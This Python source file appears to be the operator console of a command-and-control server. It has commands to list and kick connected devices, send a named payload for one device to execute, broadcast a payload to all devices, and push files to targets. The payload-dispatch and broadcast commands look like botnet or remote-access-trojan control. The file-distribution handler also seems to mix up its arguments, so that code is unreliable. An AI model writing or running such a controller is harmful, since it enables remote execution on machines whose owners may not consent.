from socketHelpers.packet import Packet

from consoleInterpreter import *
from server import DispatchServer

import os

ds = DispatchServer("localhost", 2000)
cc = CommandConsole()


@cc.command(["list"],
    Arg(int, "Page index.", optional=True))
def clist(x):
    x = [0] if x == [None] else x
    return list(ds.keys())[100*x[0]:100*x[0] + 100]

@cc.command(["count", "len"])
def ccount(x):
    return len(ds)

@cc.command(["kick"],
    Arg(str, "target device"))
def ckick(x):
    if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
    return ds[x[0]].kill()


@cc.command(["paylist"],
    Arg(str, "target device"))
def cpaylist(x):
    if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
    return ds[x[0]].send(Packet("execute_list"))

@cc.command(["payload", "pay"],
    Arg(str, "target device"),
    Arg(str, "Payload."))
def cpay(x):
    if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
    return ds[x[0]].send(Packet("execute", x[1]))

@cc.command(["active"],
    Arg(str, "target device"))
def cactive(x):
    if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
    return ds[x[0]].send(Packet("active"))

@cc.command(["paykill"],
    Arg(str, "target device"),
    Arg(str, "Payload."))
def cpaykill(x):
    if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
    return ds[x[0]].send(Packet("paykill", x[1]))


@cc.command(["payloaddis", "paydis"],
    Arg(str, "Payload."))
def cpaydis(x):
    return ds.distribute_packet(Packet("execute", x[0]))


@cc.command(["file"],
    Arg(str, "target device"),
    Arg(str, "Path to file."),
    Arg(str, "Destination filename."))
def cfile(x):
    if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
    if not os.path.exists(x[1]) : return "Can not find file '%s'"%x[1]
    return ds[x[0]].send_file(x[1], x[2])

@cc.command(["filedis"],
    Arg(str, "Path to file."),
    Arg(str, "Destination filename."))
def cfiledis(x):
    if not os.path.exists(x[1]) : return "Can not find file '%s'"%x[1]
    return ds.distribute_file(x[0], x[1])


ds.start()
while True:
    print(cc.handleExecute(input(": ")))


print(cc)
